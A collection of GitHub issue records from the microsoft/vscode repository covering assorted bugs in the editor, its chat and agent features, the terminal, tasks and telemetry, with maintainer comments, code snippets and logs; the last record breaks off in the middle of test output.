{"repo": "microsoft/vscode", "issue_number": 267145, "issue_url": "https://github.com/microsoft/vscode/issues/267145", "issue_title": "Debug Console: The Copy context menu result text with format", "issue_author": "ylazy", "issue_body": "<!-- \u26a0\ufe0f\u26a0\ufe0f Do Not Delete This! bug_report_template \u26a0\ufe0f\u26a0\ufe0f -->\n<!-- Please read our Rules of Conduct: https://opensource.microsoft.com/codeofconduct/ -->\n<!-- \ud83d\udd6e Read our guide about submitting issues: https://github.com/microsoft/vscode/wiki/Submitting-Bugs-and-Suggestions -->\n<!-- \ud83d\udd0e Search existing issues to avoid creating duplicates. -->\n<!-- \ud83e\uddea Test using the latest Insiders build to see if your issue has already been fixed: https://code.visualstudio.com/insiders/ -->\n<!-- \ud83d\udca1 Instead of creating your report here, use 'Report Issue' from the 'Help' menu in VS Code to pre-fill useful information. -->\n<!-- \ud83d\udd27 Launch with `code --disable-extensions` to check. -->\nDoes this issue occur when all extensions are disabled?: Yes\n\n<!-- \ud83e\ude93 If you answered No above, use 'Help: Start Extension Bisect' from Command Palette to try to identify the cause. -->\n<!-- \ud83d\udce3 Issues caused by an extension need to be reported directly to the extension publisher. The 'Help > Report Issue' dialog can assist with this. -->\n- VS Code Version: 1.104.1\n- OS Version: Windows 11 25H2\n\nSteps to Reproduce:\n\n1. Copy a line in the Debug Console panel\n2. Paste anywhere\n\nExpected Result: The line should be copied without ASCII Escape Sequences (plain text)\nActual Result: The line was copied with ASCII Escape Sequences.\n\nPlease view this video for more detail:\nhttps://github.com/user-attachments/assets/836ffb2c-5bd1-41f2-a8fa-54f1fe692ec4", "issue_labels": ["bug", "debug", "insiders-released"], "comments": [{"author": "ylazy", "body": "The issue still remains in 1.104.1"}, {"author": "ylazy", "body": "The issue still remains in 1.104.2"}]}
{"repo": "microsoft/vscode", "issue_number": 268298, "issue_url": "https://github.com/microsoft/vscode/issues/268298", "issue_title": "Chat sessions view hover uses `mouse` placement. It should however use `element` placement", "issue_author": "benibenj", "issue_body": "The hover in the chat sessions view will render above other entries in the view. \n\n<img width=\"706\" height=\"196\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/cef6ec58-aa50-411f-9fd3-9010e69a3b41\" />\n\nThis is not ideal. When a tree item has a large hover, we normally ty to render them to the side of the tree items so it doesn't block other entries. See how we do it for the scm graph for example:\n\n<img width=\"776\" height=\"154\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/5e2bd73e-3f00-4268-a4be-201e0eb1652a\" />", "issue_labels": ["bug", "insiders-released", "chat-sessions-view"], "comments": [{"author": "benibenj", "body": "I would recommend you use the following hover for the markdown hover scenario:\n\n```typescript\nthis.hoverService.setupDelayedHover(templateData.container, { content: tooltipContent.markdown, appearance: { showPointer: true }, position: { hoverPosition: HoverPosition.RIGHT } }, { groupId: 'chat.sessions' })\n```\n\nFor `hoverPosition` you might need to check where you are being rendered (left or right side of the editor) and depending on that set  `HoverPosition.RIGHT` or `HoverPosition.LEFT`"}]}
{"repo": "microsoft/vscode", "issue_number": 268961, "issue_url": "https://github.com/microsoft/vscode/issues/268961", "issue_title": "GitHub Copilot - panel.edit.feedback spams reject events when pending keep/undo with keyboard input", "issue_author": "kevin-m-kent", "issue_body": "\n<!-- \u26a0\ufe0f\u26a0\ufe0f Do Not Delete This! bug_report_template \u26a0\ufe0f\u26a0\ufe0f -->\n<!-- Please read our Rules of Conduct: https://opensource.microsoft.com/codeofconduct/ -->\n<!-- \ud83d\udd6e Read our guide about submitting issues: https://github.com/microsoft/vscode/wiki/Submitting-Bugs-and-Suggestions -->\n<!-- \ud83d\udd0e Search existing issues to avoid creating duplicates. -->\n<!-- \ud83e\uddea Test using the latest Insiders build to see if your issue has already been fixed: https://code.visualstudio.com/insiders/ -->\n<!-- \ud83d\udca1 Instead of creating your report here, use 'Report Issue' from the 'Help' menu in VS Code to pre-fill useful information. -->\n<!-- \ud83d\udd27 Launch with `code --disable-extensions` to check. -->\nDoes this issue occur when all extensions are disabled?: Yes/No\n\n<!-- \ud83e\ude93 If you answered No above, use 'Help: Start Extension Bisect' from Command Palette to try to identify the cause. -->\n<!-- \ud83d\udce3 Issues caused by an extension need to be reported directly to the extension publisher. The 'Help > Report Issue' dialog can assist with this. -->\n- VS Code Version: 1.105.0-insider\n- OS Version: Windows_NT arm64 10.0.26100\n\nSteps to Reproduce:\n\n1. Ask agent mode to make changes \n2. Don't keep/undo\n3. Start typing in the file that was edited and observe panel.edit.feedback events firing with every keystroke (it looks like 2-3 per keystroke)\n\nI would expect that this event should only fire when the user chooses keep or undo.\n\n@isidorn ", "issue_labels": ["bug", "info-needed", "telemetry", "insiders-released", "chat-agent-editing"], "comments": [{"author": "isidorn", "body": "I can reproduce this. @connor4312 assigning first to you since you own the agent editing experience.\nAlso assigning to September - since this bug is stopping us from using the `panel.edit.feedback` event for dashboards."}, {"author": "connor4312", "body": "What is the intention behind this telemety event? When should it get sent? It looks like it has worked this way since inception."}, {"author": "isidorn", "body": "@connor4312 the event should only be sent once per edit chunk. So ideally by user explicitly clicking on the Accept/Reject buttons we send one telemetry event. If the user starts typing in the edit chunk we should send just one rejection event (since the user had to manully intervene). \n\nRight now we send a rejection multiple times (on each keystroke) \ud83d\udc1b \n\nIf possible I would love that we fix this issue soon - as our key quality metrics depend on it.\n\n"}, {"author": "connor4312", "body": "I'll fix it imo I think this is a pretty bad metric to base things on. I make slight tweaks/edits to what the agent gives me back all the time, even though I accept the majority of the edit."}, {"author": "isidorn", "body": "@connor4312 thank you! And thanks for the feedback on the metric. \n\nYes - we are also not convinced it is the best metric, however we first want to get our hands dirty with it and plot some dashboard to see if it shows anything meaningful (e.g. how it differs across models). Once this bug is fixed we will be able to do that. Alternative is that manually editing the Edit does not send any event? And we just count the explicit Reject ones?\n\nConnor - while on the topic, let me know if you have better ideas for metrics to use here. Joe Binder will share in Redmond standup next what metrics we are looking into right now."}, {"author": "connor4312", "body": "I know @hediet did a bunch of work on the ARC metric for NES and we discussed getting that pipeline into normal agent edits too, I think that would be more ideal"}, {"author": "isidorn", "body": "@connor4312 we do have those metrics. And those metrics help us figure out the \"commit survival\". \n\nNow in addition to that metric we are exploring explicit Rejects. As a supplementary metric.\nBut maybe as a supplementary metric if you start editing code no Reject should actually be fired. \n\nIt might turn out that this supplementary metric is not useful, but we can not know that until we get our hands dirty with the data. Thus, to get our hands dirty the easiest fix from  your side would work."}]}
{"repo": "microsoft/vscode", "issue_number": 269016, "issue_url": "https://github.com/microsoft/vscode/issues/269016", "issue_title": "MCP: Long delay until setup starts when opened on `vscode` folder", "issue_author": "bpasero", "issue_body": "\nSteps to Reproduce:\n\n1. fresh setup\n2. open `vscode` folder\n3. engage with chat\n\n=> \ud83d\udc1b it takes a very long time until the sign in dialog shows\n\n![Image](https://github.com/user-attachments/assets/f7e629d4-a790-4eb1-a237-2479cc55423b)\n", "issue_labels": ["bug", "debt", "insiders-released", "workbench-copilot"], "comments": [{"author": "bpasero", "body": "Maybe related to trying to discover `agent.md` files, @aeschli to confirm"}, {"author": "bpasero", "body": "To be fair, `chat.useNestedAgentsMdFiles` is not enabled, so its something else."}, {"author": "bhavyaus", "body": "I can repro this for the `vscode` repo but not for any of our other folders. Checking to see where the slow down is."}, {"author": "bhavyaus", "body": "I removed the mcp.json config defined here https://github.com/microsoft/vscode/blob/main/.vscode/mcp.json and the setup dialog delay no longer shows up. The delay in the setup dialog being shown is because the setupAgent invocation is being delayed due to mcp server discovery and start. \ncc: @connor4312 "}, {"author": "bpasero", "body": "As discussed: rather than blocking the transition from sending the chat input to the response, I would have expected this to be done as part of the \"Working...\" response."}]}
{"repo": "microsoft/vscode", "issue_number": 269066, "issue_url": "https://github.com/microsoft/vscode/issues/269066", "issue_title": "Open chat action with multiline `query` will not place cursor at correct location", "issue_author": "benibenj", "issue_body": "The cursor is always placed at the end of the first line. It should be place at the end of the `query`\n\n<img width=\"772\" height=\"504\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/92f43173-54ed-41c5-87c0-87afe71c0dfe\" />\n\nBug is here: \nhttps://github.com/microsoft/vscode/blob/0de9bec93f74f8b926a4cd48f303612f4d1c3da8/src/vs/workbench/contrib/chat/browser/chatInputPart.ts#L980\n\nShould be something like this: `this.inputEditor.setPosition(this.inputEditor.getModel()!.getPositionAt(value.length));`", "issue_labels": ["bug", "insiders-released", "chat-input"], "comments": [{"author": "benibenj", "body": "Repro steps:\n1. Open Pull Requests View\n2. Press on `Edit Query` for one of the query nodes (Created by me, Waiting for my Review)\n3. Press `Edit with AI`\n4. Make sure the cursor is placed at the end of the input"}]}
{"repo": "microsoft/vscode", "issue_number": 269149, "issue_url": "https://github.com/microsoft/vscode/issues/269149", "issue_title": "running test message tense", "issue_author": "eleanorjboyd", "issue_body": "seems weird to say \"running\" and then show a checkmark and a percentage of tests passing. Might be worth changing the tense but idk?\n\n<img width=\"281\" height=\"40\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/52b8f9e7-287b-4ba4-8bbb-41a9c355eb37\" />", "issue_labels": ["bug", "polish", "insiders-released"], "comments": []}
{"repo": "microsoft/vscode", "issue_number": 269247, "issue_url": "https://github.com/microsoft/vscode/issues/269247", "issue_title": "Italics break when formatting markdown when certain characters are used", "issue_author": "Tyriar", "issue_body": "How rules normally look:\n\n<img width=\"462\" height=\"80\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/e16187e0-a0d9-4b90-b37b-8715ca7b4fb2\" />\n\nWhen the `Select-` prefix regex is referenced it breaks the wrapping `_` to style it with italics though:\n\n<img width=\"462\" height=\"196\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/c26dd4c9-d11e-45a7-9873-9bf10579ebd2\" />\n\n<img width=\"461\" height=\"195\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/7f227e2c-e5ce-4297-89df-6d0dfa777eae\" />\n\nCode reference:\n\nhttps://github.com/microsoft/vscode/blob/6e60e679fc6b6a512edbed9a750d7c5811595861/src/vs/workbench/contrib/terminalContrib/chatAgentTools/browser/tools/runInTerminalTool.ts#L865-L901", "issue_labels": ["bug", "insiders-released", "chat-terminal"], "comments": [{"author": "mjbvz", "body": "What steps can I take to repo this?\n\nAlso instead of using markdown to add the italic, can you add it with css? \n"}, {"author": "Tyriar", "body": "Ask to run Select-Object should repro it. I could do italics in css, would be good to fix the root cause though. "}, {"author": "mjbvz", "body": "Thanks. Opened upstream marked issue: https://github.com/markedjs/marked/issues/3774\n\nCan be fixed by using `*` instead of `_` for the italics, but I'd recommend using css for the italics if possible"}, {"author": "Tyriar", "body": "Not so easy to use CSS here unfortunately since this is a generic markdown string we pass to somewhere else. Moved to asterisk as the easy fix for now."}, {"author": "Tyriar", "body": "Will close this out with https://github.com/microsoft/vscode/pull/269646"}]}
{"repo": "microsoft/vscode", "issue_number": 269590, "issue_url": "https://github.com/microsoft/vscode/issues/269590", "issue_title": "Terminal voice indicator does not move with the text", "issue_author": "bpasero", "issue_body": "<img width=\"258\" height=\"139\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/ea60ce4e-b3ba-4003-9b5e-81d7bf96ae1d\" />\n\nThe icon should move always to the end of the text, like it does in the editor.", "issue_labels": ["bug", "terminal", "insiders-released"], "comments": [{"author": "meganrogge", "body": "This is when using terminal: start dictation"}]}
{"repo": "microsoft/vscode", "issue_number": 269686, "issue_url": "https://github.com/microsoft/vscode/issues/269686", "issue_title": "Rerun task not working in monorepos", "issue_author": "Celtic-Bytes", "issue_body": "\nType: <b>Bug</b>\n\n## Issue\n\n`Rerun task` not working properly in monorepo.\nThis error seems to occur with tasks that are left running in the background, such as a --watch.\n\n## Steps to reproduce\n\n1- Create a simple monorepo with npm workspaces. \n2- Create any kind of repo inside the monorepo ( library, app or what you want).\n3- Launch any script you want from the NPM script window.\n4- Try to `rerun task` from the terminal side bar. It will fail and show an error in the bottom right corner: `Task dev - packages/cb-password-manager-library no longer exists or has been modified. Cannot restart.`\n\nhttps://github.com/user-attachments/assets/74553bd9-01e7-44ed-95f1-b69ce37b3829\n\nVS Code version: Code 1.104.3 (385651c938df8a906869babee516bffd0ddb9829, 2025-10-02T12:30:51.747Z)\nOS version: Windows_NT x64 10.0.26100\nModes:\n\n<details>\n<summary>System Info</summary>\n\n|Item|Value|\n|---|---|\n|CPUs|11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz (16 x 2304)|\n|GPU Status|2d_canvas: enabled<br>direct_rendering_display_compositor: disabled_off_ok<br>gpu_compositing: enabled<br>multiple_raster_threads: enabled_on<br>opengl: enabled_on<br>rasterization: enabled<br>raw_draw: disabled_off_ok<br>skia_graphite: disabled_off<br>trees_in_viz: disabled_off<br>video_decode: enabled<br>video_encode: enabled<br>vulkan: disabled_off<br>webgl: enabled<br>webgl2: enabled<br>webgpu: enabled<br>webnn: disabled_off|\n|Load (avg)|undefined|\n|Memory (System)|31.79GB (20.50GB free)|\n|Process Argv|--crash-reporter-id a4868ab4-718b-4469-820a-1c09a518091d|\n|Screen Reader|no|\n|VM|0%|\n</details><details><summary>Extensions (53)</summary>\n\nExtension|Author (truncated)|Version\n---|---|---\ncodesnap|adp|1.3.4\ntsl-problem-matcher|amo|0.6.2\nng-template|Ang|20.2.2\ncssrem|cip|4.1.1\nesbuild-problem-matchers|con|0.0.3\nangular-schematics|cyr|6.23.0\nvscode-eslint|dba|3.0.16\nproxy-toggle|Dom|1.0.1\nes7-react-js-snippets|dsz|4.4.3\ngitlens|eam|17.5.1\nprettier-vscode|esb|11.0.0\ncode-runner|for|0.12.2\nfetch-client|Gan|1.8.0\ncopilot|Git|1.372.0\ncopilot-chat|Git|0.31.4\nvscode-github-actions|git|0.28.0\ntodo-tree|Gru|0.0.226\nvscode-drawio|hed|1.9.0\nAngular2|joh|18.0.2\nvscode-peacock|joh|4.2.2\nrainbow-csv|mec|3.22.0\ngit-graph|mhu|1.30.0\nremote-ssh|ms-|0.120.0\nremote-ssh-edit|ms-|0.87.0\nextension-test-runner|ms-|0.0.12\nremote-explorer|ms-|0.5.0\nvsliveshare|ms-|1.0.5959\nvscode-versionlens|pfl|1.22.4\nmaterial-icon-theme|PKi|5.27.0\npostman-for-vscode|Pos|1.16.2\nquicktype|qui|23.0.170\nvscode-services|rap|1.0.2\njava|red|1.46.0\nvscode-xml|red|0.29.0\nvscode-yaml|red|1.19.0\nLiveServer|rit|5.7.9\npartial-diff|ryu|1.4.3\ncode-spell-checker|str|4.2.6\ncode-spell-checker-spanish|str|2.3.9\nvscode-stylelint|sty|1.5.3\nerrorlens|use|3.26.0\nintellicode-api-usage-examples|Vis|0.2.9\nvscodeintellicode|Vis|1.3.2\nmigrate-java-to-azure|vsc|1.5.2\nvscode-java-debug|vsc|0.58.2\nvscode-java-dependency|vsc|0.25.2025092303\nvscode-java-pack|vsc|0.30.2\nvscode-java-test|vsc|0.43.1\nvscode-java-upgrade|vsc|1.6.1\nvscode-maven|vsc|0.44.0\nvscode-icons|vsc|12.14.0\nJavaScriptSnippets|xab|1.8.0\nmarkdown-all-in-one|yzh|3.6.3\n\n(1 theme extensions excluded)\n\n</details><details>\n<summary>A/B Experiments</summary>\n\n```\nvsliv368:30146709\nbinariesv615:30325510\nnativeloc1:31344060\ndwcopilot:31170013\ndwoutputs:31242946\ncopilot_t_ci:31333650\ne5gg6876:31282496\npythonrdcb7:31342333\nusemplatestapi:31297334\naj953862:31281341\ncs4_fixed:31391938\nnes-set-on:31351930\ntestaa123cf:31335227\nonetestforazureexp:31335613\n6abeh943:31336334\n0cj2b977:31352657\ngendocstringf:31395206\ngaj49834:31362110\nasdad:31365766\ncloudbuttont:31379625\ntodos-0:31390406\nv66_all_req:31396635\nmultireplacestringcontrol:31393296\ntreatment_gpt5applypatchexclusively:31394181\n3efgi100_wstrepl:31382709\ntrigger-command-fix:31379601\nauto_model_enabled:31385282\nuse-responses-api:31390855\ncontrol-c48h7192:31394828\n86221569:31396493\n\n```\n\n</details>\n\n<!-- generated by issue reporter -->", "issue_labels": ["bug", "tasks", "insiders-released"], "comments": [{"author": "meganrogge", "body": "I cannot repro, thus closing\n\nhttps://github.com/user-attachments/assets/8a794a1c-96cf-46f7-ab0a-edd260f53d33"}, {"author": "Celtic-Bytes", "body": "Maybe if you take time to read the issue you will notice i said the issue happens with tasks that KEEPS RUNNING IN THE BACKGROUND like a 'watch',a dev server something similar.. In your video, you are rerunning a normal task."}, {"author": "meganrogge", "body": "Ah, I see. `Task watch - build no longer exists or has been modified. Cannot restart.` happens in that case"}]}
{"repo": "microsoft/vscode", "issue_number": 269706, "issue_url": "https://github.com/microsoft/vscode/issues/269706", "issue_title": "editor.action.inlineSuggest.snooze doesn't work with a number argument", "issue_author": "ulugbekna", "issue_body": "repro: \n\n1. add this keybinding to snooze copilot for 5 minutes\n\n```\n  {\n    \"key\": \"cmd+e 5\",\n    \"command\": \"editor.action.inlineSuggest.snooze\",\n    \"args\": 5\n  },\n```\n2. trigger the keybinding when editor is focused\n3. it's not snoozed\n\nmay be related to https://github.com/microsoft/vscode/issues/257629\n\nVersion: 1.105.0-insider\nCommit: e0dada76949dc8179d5c8e03f1bae491c0c2ec51\nDate: 2025-10-03T00:46:58.091Z\nElectron: 37.6.0\nElectronBuildId: 12502201\nChromium: 138.0.7204.251\nNode.js: 22.19.0\nV8: 13.8.258.32-electron.0\nOS: Darwin arm64 24.6.0", "issue_labels": ["bug", "insiders-released", "NES"], "comments": []}
{"repo": "microsoft/vscode", "issue_number": 269745, "issue_url": "https://github.com/microsoft/vscode/issues/269745", "issue_title": "walkthrough action is not correct", "issue_author": "meganrogge", "issue_body": "I think the command ID is wrong\n\n> I still get the same errors as Henning. I think the extension needs to be activated, first. I do not have accessibility mode on and the VS Code Speech extension has not activated.\n> \n> Version: 1.105.0-insider (system setup)\n> Commit: e0dada76949dc8179d5c8e03f1bae491c0c2ec51\n> Date: 2025-10-03T00:46:58.091Z\n> Electron: 37.6.0\n> ElectronBuildId: 12502201\n> Chromium: 138.0.7204.251\n> Node.js: 22.19.0\n> V8: 13.8.258.32-electron.0\n> OS: Windows_NT x64 10.0.26100\n> \n> ```\n> workbench.desktop.main.js:36   ERR command 'workbench.action.terminal.startVoiceDictation' not found: Error: command 'workbench.action.terminal.startVoiceDictation' not found\n>     at gJe.n (vscode-file://vscode-app/c:/Program%20Files/Microsoft%20VS%20Code%20Insiders/resources/app/out/vs/workbench/workbench.desktop.main.js:1337:3892)\n>     at gJe.executeCommand (vscode-file://vscode-app/c:/Program%20Files/Microsoft%20VS%20Code%20Insiders/resources/app/out/vs/workbench/workbench.desktop.main.js:1337:3824)\n> error @ workbench.desktop.main.js:36\n> error @ workbench.desktop.main.js:36\n> error @ workbench.desktop.main.js:3773\n> oc @ workbench.desktop.main.js:3770\n> (anonymous) @ workbench.desktop.main.js:3770\n> onUnexpectedError @ workbench.desktop.main.js:7\n> bt @ workbench.desktop.main.js:7\n> (anonymous) @ workbench.desktop.main.js:3770\n> workbench.desktop.main.js:36   ERR command 'workbench.action.terminal.stopVoiceDictation' not found: Error: command 'workbench.action.terminal.stopVoiceDictation' not found\n>     at gJe.n (vscode-file://vscode-app/c:/Program%20Files/Microsoft%20VS%20Code%20Insiders/resources/app/out/vs/workbench/workbench.desktop.main.js:1337:3892)\n>     at gJe.executeCommand (vscode-file://vscode-app/c:/Program%20Files/Microsoft%20VS%20Code%20Insiders/resources/app/out/vs/workbench/workbench.desktop.main.js:1337:3824)\n> ``` \n\n _Originally posted by @rzhao271 in [#265738](https://github.com/microsoft/vscode/issues/265738#issuecomment-3366483193)_", "issue_labels": ["bug", "accessibility", "insiders-released"], "comments": []}
{"repo": "microsoft/vscode", "issue_number": 269958, "issue_url": "https://github.com/microsoft/vscode/issues/269958", "issue_title": "Agent still runs tests terminal after run_tests tool via to look at errors", "issue_author": "digitarald", "issue_body": "I would hope that the agent gets all necessary errors from run_tests; so the terminal isn't needed and tests are not run multiple times just to get more errors; saving context tokens.\n\n<img width=\"504\" height=\"226\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/5c6cb500-f925-4ca8-a03e-49a09f90f284\" />\n\n`runTests` too call:\n\n```\n# Tool Call - toolu_01VbVyyG78mL2ozxQkoFAnZk__vscode-1759705184349\n\n## Request\n~~~\nid   : toolu_01VbVyyG78mL2ozxQkoFAnZk__vscode-1759705184349\ntool : runTests\nargs : {\n  \"files\": [\n    \"/Users/digitarald/Developer/pop-bake/src/app/__tests__/page.test.tsx\",\n    \"/Users/digitarald/Developer/pop-bake/src/contexts/__tests__/cart-context.test.tsx\"\n  ]\n}\n~~~\n## Response\n~~~\n<summary passed=0 failed=11 /><testFailure name=\"/Users/digitarald/Developer/pop-bake/src/contexts/__tests__/cart-context.test.tsx#CartContext cart management should add items to cart\" path=\"orta.vscode-jest:pop-bake > /Users/digitarald/Developer/pop-bake/src > /Users/digitarald/Developer/pop-bake/src/contexts > /Users/digitarald/Developer/pop-bake/src/contexts/__tests__ > /Users/digitarald/Developer/pop-bake/src/contexts/__tests__/cart-context.test.tsx > /Users/digitarald/Developer/pop-bake/src/contexts/__tests__/cart-context.test.tsx#CartContext > /Users/digitarald/Developer/pop-bake/src/contexts/__tests__/cart-context.test.tsx#CartContext cart management\">\n</testFailure>\n<testFailure name=\"/Users/digitarald/Developer/pop-bake/src/contexts/__tests__/cart-context.test.tsx#CartContext cart management should update item quantity\" path=\"orta.vscode-jest:pop-bake > /Users/digitarald/Developer/pop-bake/src > /Users/digitarald/Developer/pop-bake/src/contexts > /Users/digitarald/Developer/pop-bake/src/contexts/__tests__ > /Users/digitarald/Developer/pop-bake/src/contexts/__tests__/cart-context.test.tsx > /Users/digitarald/Developer/pop-bake/src/contexts/__tests__/cart-context.test.tsx#CartContext > /Users/digitarald/Developer/pop-bake/src/contexts/__tests__/cart-context.test.tsx#CartContext cart management\">\n</testFailure>\n<testFailure name=\"/Users/digitarald/Developer/pop-bake/src/contexts/__tests__/cart-context.test.tsx#CartContext cart management should remove items from cart\" path=\"orta.vscode-jest:pop-bake > /Users/digitarald/Developer/pop-bake/src > /Users/digitarald/Developer/pop-bake/src/contexts > /Users/digitarald/Developer/pop-bake/src/contexts/__tests__ > /Users/digitarald/Developer/pop-bake/src/contexts/__tests__/cart-context.test.tsx > /Users/digitarald/Developer/pop-bake/src/contexts/__tests__/cart-context.test.tsx#CartContext > /Users/digitarald/Developer/pop-bake/src/contexts/__tests__/cart-context.test.tsx#CartContext cart management\">\n</testFailure>\n<testFailure name=\"/Users/digitarald/Developer/pop-bake/src/contexts/__tests__/cart-context.test.tsx#CartContext cart management should clear entire cart\" path=\"orta.vscode-jest:pop-bake > /Users/digitarald/Developer/pop-bake/src > /Users/digitarald/Developer/pop-bake/src/contexts > /Users/digitarald/Developer/pop-bake/src/contexts/__tests__ > /Users/digitarald/Developer/pop-bake/src/contexts/__tests__/cart-context.test.tsx > /Users/digitarald/Developer/pop-bake/src/contexts/__tests__/cart-context.test.tsx#CartContext > /Users/digitarald/Developer/pop-bake/src/contexts/__tests__/cart-context.test.tsx#CartContext cart management\">\n</testFailure>\n<testFailure name=\"/Users/digitarald/Developer/pop-bake/src/contexts/__tests__/cart-context.test.tsx#CartContext cart calculations should calculate total items correctly\" path=\"orta.vscode-jest:pop-bake > /Users/digitarald/Developer/pop-bake/src > /Users/digitarald/Developer/pop-bake/src/contexts > /Users/digitarald/Developer/pop-bake/src/contexts/__tests__ > /Users/digitarald/Developer/pop-bake/src/contexts/__tests__/cart-context.test.tsx > /Users/digitarald/Developer/pop-bake/src/contexts/__tests__/cart-context.test.tsx#CartContext > /Users/digitarald/Developer/pop-bake/src/contexts/__tests__/cart-context.test.tsx#CartContext cart calculations\">\n</testFailure>\n<testFailure name=\"/Users/digitarald/Developer/pop-bake/src/contexts/__tests__/cart-context.test.tsx#CartContext cart calculations should calculate total price correctly\" path=\"orta.vscode-jest:pop-bake > /Users/digitarald/Developer/pop-bake/src > /Users/digitarald/Developer/pop-bake/src/contexts > /Users/digitarald/Developer/pop-bake/src/contexts/__tests__ > /Users/digitarald/Developer/pop-bake/src/contexts/__tests__/cart-context.test.tsx > /Users/digitarald/Developer/pop-bake/src/contexts/__tests__/cart-context.test.tsx#CartContext > /Users/digitarald/Developer/pop-bake/src/contexts/__tests__/cart-context.test.tsx#CartContext cart calculations\">\n</testFailure>\n<testFailure name=\"/Users/digitarald/Developer/pop-bake/src/contexts/__tests__/cart-context.test.tsx#CartContext cart calculations should get item quantity correctly\" path=\"orta.vscode-jest:pop-bake > /Users/digitarald/Developer/pop-bake/src > /Users/digitarald/Developer/pop-bake/src/contexts > /Users/digitarald/Developer/pop-bake/src/contexts/__tests__ > /Users/digitarald/Developer/pop-bake/src/contexts/__tests__/cart-context.test.tsx > /Users/digitarald/Developer/pop-bake/src/contexts/__tests__/cart-context.test.tsx#CartContext > /Users/digitarald/Developer/pop-bake/src/contexts/__tests__/cart-context.test.tsx#CartContext cart calculations\">\n</testFailure>\n<testFailure name=\"/Users/digitarald/Developer/pop-bake/src/contexts/__tests__/cart-context.test.tsx#CartContext stock management should respect stock limits when adding items\" path=\"orta.vscode-jest:pop-bake > /Users/digitarald/Developer/pop-bake/src > /Users/digitarald/Developer/pop-bake/src/contexts > /Users/digitarald/Developer/pop-bake/src/contexts/__tests__ > /Users/digitarald/Developer/pop-bake/src/contexts/__tests__/cart-context.test.tsx > /Users/digitarald/Developer/pop-bake/src/contexts/__tests__/cart-context.test.tsx#CartContext > /Users/digitarald/Developer/pop-bake/src/contexts/__tests__/cart-context.test.tsx#CartContext stock management\">\n</testFailure>\n<testFailure name=\"/Users/digitarald/Developer/pop-bake/src/contexts/__tests__/cart-context.test.tsx#CartContext stock management should respect stock limits when updating quantity\" path=\"orta.vscode-jest:pop-bake > /Users/digitarald/Developer/pop-bake/src > /Users/digitarald/Developer/pop-bake/src/contexts > /Users/digitarald/Developer/pop-bake/src/contexts/__tests__ > /Users/digitarald/Developer/pop-bake/src/contexts/__tests__/cart-context.test.tsx > /Users/digitarald/Developer/pop-bake/src/contexts/__tests__/cart-context.test.tsx#CartContext > /Users/digitarald/Developer/pop-bake/src/contexts/__tests__/cart-context.test.tsx#CartContext stock management\">\n</testFailure>\n<testFailure name=\"/Users/digitarald/Developer/pop-bake/src/contexts/__tests__/cart-context.test.tsx#CartContext localStorage integration should save cart to localStorage\" path=\"orta.vscode-jest:pop-bake > /Users/digitarald/Developer/pop-bake/src > /Users/digitarald/Developer/pop-bake/src/contexts > /Users/digitarald/Developer/pop-bake/src/contexts/__tests__ > /Users/digitarald/Developer/pop-bake/src/contexts/__tests__/cart-context.test.tsx > /Users/digitarald/Developer/pop-bake/src/contexts/__tests__/cart-context.test.tsx#CartContext > /Users/digitarald/Developer/pop-bake/src/contexts/__tests__/cart-context.test.tsx#CartContext localStorage integration\">\n</testFailure>\n<testFailure name=\"/Users/digitarald/Developer/pop-bake/src/contexts/__tests__/cart-context.test.tsx#CartContext localStorage integration should remove localStorage when cart is empty\" path=\"orta.vscode-jest:pop-bake > /Users/digitarald/Developer/pop-bake/src > /Users/digitarald/Developer/pop-bake/src/contexts > /Users/digitarald/Developer/pop-bake/src/contexts/__tests__ > /Users/digitarald/Developer/pop-bake/src/contexts/__tests__/cart-context.test.tsx > /Users/digitarald/Developer/pop-bake/src/contexts/__tests__/cart-context.test.tsx#CartContext > /Users/digitarald/Developer/pop-bake/src/contexts/__tests__/cart-context.test.tsx#CartContext localStorage integration\">\n</testFailure>\n\n~~~\n```\n\n`npm test \u2026` output\n\n```\n\n> pop-bake-app@0.1.0 test\n> jest src/app/__tests__/page.test.tsx --verbose\n\n  console.error\n    An update to CartProvider inside a test was not wrapped in act(...).\n    \n    When testing, code that causes React state updates should be wrapped into act(...):\n    \n    act(() => {\n      /* fire events that update state */\n    });\n    /* assert on the output */\n    \n    This ensures that you're testing the behavior the user would see in the browser. Learn more at https://react.dev/link/wrap-tests-with-act\n\n      328 |     const getInitialSession = async () => {\n      329 |       const { data: { user } } = await supabase.auth.getUser()\n    > 330 |       dispatch({ type: 'SET_USER', payload: user })\n          |       ^\n      331 |       if (user) {\n      332 |         await syncCartFromDatabase()\n      333 |       }\n\n      at node_modules/react-dom/cjs/react-dom-client.development.js:16023:19\n      at runWithFiberInDEV (node_modules/react-dom/cjs/react-dom-client.development.js:1522:13)\n      at warnIfUpdatesNotWrappedWithActDEV (node_modules/react-dom/cjs/react-dom-client.development.js:16022:9)\n      at scheduleUpdateOnFiber (node_modules/react-dom/cjs/react-dom-client.development.js:14396:11)\n      at dispatchReducerAction (node_modules/react-dom/cjs/react-dom-client.development.js:6916:14)\n      at dispatch (src/contexts/cart-context.tsx:330:7)\n\n  console.error\n    An update to AuthProvider inside a test was not wrapped in act(...).\n    \n    When testing, code that causes React state updates should be wrapped into act(...):\n    \n    act(() => {\n      /* fire events that update state */\n    });\n    /* assert on the output */\n    \n    This ensures that you're testing the behavior the user would see in the browser. Learn more at https://react.dev/link/wrap-tests-with-act\n\n      26 |       const { data: { user } } = await supabase.auth.getUser()\n      27 |       setUser(user)\n    > 28 |       setLoading(false)\n         |       ^\n      29 |     }\n      30 |\n      31 |     getInitialSession()\n\n      at node_modules/react-dom/cjs/react-dom-client.development.js:16023:19\n      at runWithFiberInDEV (node_modules/react-dom/cjs/react-dom-client.development.js:1522:13)\n      at warnIfUpdatesNotWrappedWithActDEV (node_modules/react-dom/cjs/react-dom-client.development.js:16022:9)\n      at scheduleUpdateOnFiber (node_modules/react-dom/cjs/react-dom-client.development.js:14396:11)\n      at dispatchSetStateInternal (node_modules/react-dom/cjs/react-dom-client.development.js:6969:13)\n      at dispatchSetState (node_modules/react-dom/cjs/react-dom-client.development.js:6927:7)\n      at setLoading 